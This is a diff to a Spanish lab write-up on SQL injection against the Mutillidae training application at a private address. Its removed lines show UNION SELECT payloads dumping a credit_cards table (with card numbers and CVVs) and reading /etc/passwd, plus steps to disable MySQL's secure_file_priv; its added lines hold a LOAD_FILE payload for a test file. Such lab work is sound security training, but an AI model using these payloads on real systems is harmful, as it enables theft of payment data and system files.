@@ -459,66 +459,17 @@ CHECK_CONTRAINTS
 ![Lista de todas las tablas](img/listar-bd.jpg)
 ---
 
-#### 3.2.7 Extraer datos de tabla sensible (credit_cards)
+#### 3.2.7 Acceder a ficheros de manera remota
+
 
 **Payload:**
 ```sql
-' UNION SELECT null,ccnumber,ccv,expiration,null,null,null FROM credit_cards-- 
+' union select null,load_file('/var/lib/mysql-files/ficheroprueba.txt'),null,null,null,null,null-- 
 ```
 
 **Resultado:**
 ```
-Credit Card Number  | CVV  | Expiration
-4444111122223333   | 745  | 2012-03-01
-7746536337776330   | 722  | 2015-04-01
-8242325748474749   | 461  | 2016-03-01
-... [más tarjetas]
-```
-
-**📸 Screenshot:** `08-sqli-credit-cards.png`
-
----
-
-#### 3.2.8 Lectura de archivos del sistema
-
-**Verificar configuración de MySQL:**
-```bash
-# Desde Ubuntu Mutillidae:
-sudo mysql -u root -p
-
-mysql> SHOW VARIABLES LIKE 'secure_file_priv';
-+------------------+-------+
-| Variable_name    | Value |
-+------------------+-------+
-| secure_file_priv |       |  ← Vacío = sin restricción
-+------------------+-------+
-```
-
-**Si está restringido, deshabilitar:**
-```bash
-sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf
-
-# Añadir o modificar:
-[mysqld]
-secure_file_priv = ""
-
-# Reiniciar MySQL:
-sudo systemctl restart mysql
-```
-
-**Payload para lectura de archivo:**
-```sql
-' UNION SELECT null,LOAD_FILE('/etc/passwd'),null,null,null,null,null-- 
-```
-
-**Resultado:**
-```
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-mysql:x:129:137:MySQL Server,,,:/nonexistent:/bin/false
-estefania:x:1000:1000:estefania,,,:/home/estefania:/bin/bash
-... [contenido completo]
+username=esto es una prueba
 ```
 
 ![Acceso a fichero de manea remota](img/acceder-fichero.remoto.jpg)
@@ -531,6 +482,7 @@ estefania:x:1000:1000:estefania,,,:/home/estefania:/bin/bash
 **URL vulnerable:**
 ```
 http://192.168.0.21/mutillidae/index.php?page=user-info.php
+
 ```
 
 **Payload:**
